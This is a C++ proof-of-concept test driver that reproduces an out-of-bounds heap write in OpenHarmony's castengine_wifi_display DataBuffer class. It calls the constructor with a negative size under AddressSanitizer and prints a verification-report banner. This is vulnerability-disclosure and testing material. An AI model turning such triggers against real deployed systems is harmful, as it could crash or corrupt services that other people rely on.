/*
 * PoC: DataBuffer negative size constructor → heap-buffer-overflow (CWE-20)
 * Target: OpenHarmony castengine_wifi_display
 * File: services/utils/data_buffer.cpp
 *
 * Method: GN Target-Compile — compile real DataBuffer.cpp into .a, link test driver
 *
 * Vulnerability:
 *   DataBuffer(int size) does not validate size > 0.
 *   DataBuffer(-1) → new uint8_t[0], then data_[-1] = '\0' → OOB write
 *   DataBuffer(INT_MIN) → new uint8_t[INT_MIN+1] → wrap to 0, OOB write
 */

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <climits>
#include <signal.h>

#include "data_buffer.h"

using OHOS::Sharing::DataBuffer;

static void signal_handler(int sig) {
    fprintf(stderr, "\n[Signal] Caught signal %d — vulnerability triggered!\n", sig);
    _exit(1);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGABRT, signal_handler);

    printf("===============================================================\n");
    printf("  FERMAT L4 VERIFICATION REPORT\n");
    printf("===============================================================\n");
    printf("Module:    castengine_wifi_display (OpenHarmony)\n");
    printf("Binary:    data_buffer_poc (GN+Ninja, linked against data_buffer.a)\n");
    printf("Sanitizer: ASan + UBSan\n");
    printf("===============================================================\n\n");

    // Verification 1: Normal usage
    printf("[Verification 1] Normal DataBuffer usage\n");
    DataBuffer buf1(100);
    const char *testData = "Hello OHOS";
    buf1.PushData(testData, strlen(testData));
    printf("  Created DataBuffer(100), pushed %zu bytes\n", strlen(testData));
    printf("  Size=%d, Capacity=%d, Data=\"%s\"\n",
           buf1.Size(), buf1.Capacity(), buf1.Peek());
    printf("  Result: PASS\n\n");

    // Verification 2: Copy constructor (the inverted error check)
    printf("[Verification 2] Copy constructor\n");
    DataBuffer buf2(buf1);
    printf("  Copied buf1 → buf2: Size=%d, Data=\"%s\"\n",
           buf2.Size(), buf2.Peek());
    printf("  Result: PASS\n\n");

    // Verification 3: Trigger negative size vulnerability
    printf("[Verification 3] Trigger CWE-20: Negative size constructor\n");
    printf("  Vulnerable code (data_buffer.cpp constructor):\n");
    printf("    DataBuffer(int size) {\n");
    printf("      data_ = new uint8_t[size + 1];  // size=-1 → new uint8_t[0]\n");
    printf("      data_[size] = '\\0';             // data_[-1] = '\\0' ← OOB WRITE\n");
    printf("      capacity_ = size;                // capacity = -1\n");
    printf("      size_ = 0;\n");
    printf("    }\n\n");
    printf("  Triggering: DataBuffer(-1)\n");
    printf("  Expected: ASan heap-buffer-overflow on data_[-1] write\n\n");

    // This should trigger ASan
    DataBuffer bufBad(-1);

    printf("  If you see this, ASan did not catch it (unexpected)\n");
    return 0;
}
